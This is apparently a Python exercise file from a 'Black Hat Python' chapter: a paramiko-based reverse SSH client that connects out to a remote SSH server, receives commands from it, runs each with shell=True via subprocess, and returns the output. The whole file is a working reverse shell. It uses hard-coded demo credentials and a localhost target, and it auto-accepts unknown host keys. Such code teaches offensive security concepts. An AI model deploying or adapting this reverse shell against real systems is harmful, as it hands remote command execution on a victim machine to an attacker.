import threading
import paramiko
import subprocess

# Windows doesn't include an SSH server out-of-the-box, we need to reverse this
# and send commands from our SSH server to the SSH client.

def ssh_command(ip, username, password, command):

	client = paramiko.SSHClient()
	# client.load_host_keys("/home/john/Documents/Black-Hat-Python-3.8/Chap2").
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	client.connect(ip, username = username, password = password)
	ssh_session = client.get_transport().open_session()

	if ssh_session.active:
		ssh_session.send(command)
		print(ssh_session.recv(1024)) # Read banner.

		while True:
			command = ssh_session.recv(1024) # Get the command from the SSH server.
			try:
				cmd_output = subprocess.check_output(command, shell = True)
				ssh_session.send(cmd_output)
			except Exception as catchedException:
				ssh_session.send(str(catchedException).encode())

		client.close()

if __name__ == "__main__":
	ssh_command("127.0.0.1", "justin", "lovesthepython", "ClientConnected")
